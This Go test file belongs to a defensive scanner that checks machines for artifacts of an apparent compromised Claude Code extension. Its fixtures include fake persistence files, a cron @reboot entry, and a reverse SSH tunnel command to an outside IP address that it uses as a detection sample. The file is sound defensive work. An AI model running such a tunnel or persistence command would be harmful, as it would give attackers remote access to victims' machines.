package scan

import (
	"os"
	"path/filepath"
	"testing"

	"check-claude-code-exfil/internal/ioc"
)

func TestRunFixtureFindsArtifacts(t *testing.T) {
	home := t.TempDir()
	tempDir := t.TempDir()

	mustWrite(t, filepath.Join(home, ".config", ".smt"), "#!/bin/sh\n# "+ioc.TunnelKeyComment+"\n"+ioc.TunnelServer+"\n")
	mustWrite(t, filepath.Join(home, ".config", ".smtk"), "placeholder")
	mustWrite(t, filepath.Join(home, ".ssh", "authorized_keys"), "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample "+ioc.VictimKeyComment+"\n")
	mustWrite(t, filepath.Join(home, ".vscode", "extensions", "anthropic.claude-code-2.1.313-linux-x64", "package.json"),
		`{"name":"claude-code","publisher":"anthropic","version":"2.1.313"}`+"\n")
	mustWrite(t, filepath.Join(home, ".vscode", "extensions", "anthropic.claude-code-2.1.313-linux-x64", "extension.js"), "console.log('clean');\n")
	mustWrite(t, filepath.Join(tempDir, ".stk_0123456789"), "placeholder")

	report := Run(Options{
		Version:        "test",
		Homes:          []string{home},
		TempDirs:       []string{tempDir},
		IncludeProcess: false,
		IncludeNetwork: false,
	})

	if !report.Affected || report.ExitCode != 1 {
		t.Fatalf("expected affected report, got affected=%v exit=%d", report.Affected, report.ExitCode)
	}
	for _, id := range []string{
		"persistence-script-smt",
		"tunnel-key-smtk",
		"ssh-victim-key-comment",
		"extension-vulnerable-version",
		"temp-tunnel-key",
	} {
		if !reportHasFinding(report, id) {
			t.Errorf("expected finding %q, got %#v", id, report.Findings)
		}
	}
}

func TestTempKeyNameMatching(t *testing.T) {
	valid := []string{".stk_0123456789", ".stk_abcdef0123"}
	invalid := []string{".stk_", ".stk_short", ".stk_01234567890", ".stk_zzzzzzzzzz"}
	for _, name := range valid {
		if !tempKeyPattern.MatchString(name) {
			t.Errorf("expected %q to match", name)
		}
	}
	for _, name := range invalid {
		if tempKeyPattern.MatchString(name) {
			t.Errorf("expected %q not to match", name)
		}
	}
}

func TestCronContentDetection(t *testing.T) {
	s := newTestScanner()
	s.checkCronContent("/tmp/fake-crontab", "@reboot /bin/sh /home/alice/.config/.smt\n")
	if !reportHasFinding(s.report, "cron-persistence") {
		t.Fatalf("expected cron persistence finding, got %#v", s.report.Findings)
	}
}

func TestFileSHA256(t *testing.T) {
	path := filepath.Join(t.TempDir(), "sample.txt")
	mustWrite(t, path, "abc")
	got, err := fileSHA256(path)
	if err != nil {
		t.Fatal(err)
	}
	const want = "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
	if got != want {
		t.Fatalf("unexpected sha256 %q", got)
	}
}

func TestNormalizeTextOutput(t *testing.T) {
	data := []byte{0xff, 0xfe, 'O', 0x00, 'K', 0x00}
	if got := string(normalizeTextOutput(data)); got != "OK" {
		t.Fatalf("unexpected normalized output %q", got)
	}
}

func TestProcessReasons(t *testing.T) {
	reasons := processReasons(`ssh -N -R "*:0:localhost:22" -i /tmp/.stk_0123456789 tunnel@134.209.82.225`)
	for _, want := range []string{"134.209.82.225", "*:0:localhost:22", ".stk_"} {
		found := false
		for _, reason := range reasons {
			if reason == want {
				found = true
			}
		}
		if !found {
			t.Errorf("expected reason %q in %#v", want, reasons)
		}
	}
}

func TestReportExitCodes(t *testing.T) {
	clean := &Report{}
	clean.finalize()
	if clean.ExitCode != 0 || clean.Affected {
		t.Fatalf("expected clean exit 0, got %d", clean.ExitCode)
	}

	incomplete := &Report{Warnings: []Warning{{Check: "test", Message: "incomplete", Incomplete: true}}}
	incomplete.finalize()
	if incomplete.ExitCode != 2 {
		t.Fatalf("expected incomplete exit 2, got %d", incomplete.ExitCode)
	}

	affected := &Report{Findings: []Finding{{ID: "x", Severity: SeverityCritical, Category: "test", Title: "x"}}}
	affected.finalize()
	if affected.ExitCode != 1 || !affected.Affected {
		t.Fatalf("expected affected exit 1, got %d", affected.ExitCode)
	}
}

func newTestScanner() *scanner {
	return &scanner{
		report: &Report{},
		seen:   make(map[string]struct{}),
	}
}

func reportHasFinding(report *Report, id string) bool {
	for _, finding := range report.Findings {
		if finding.ID == id {
			return true
		}
	}
	return false
}

func mustWrite(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}
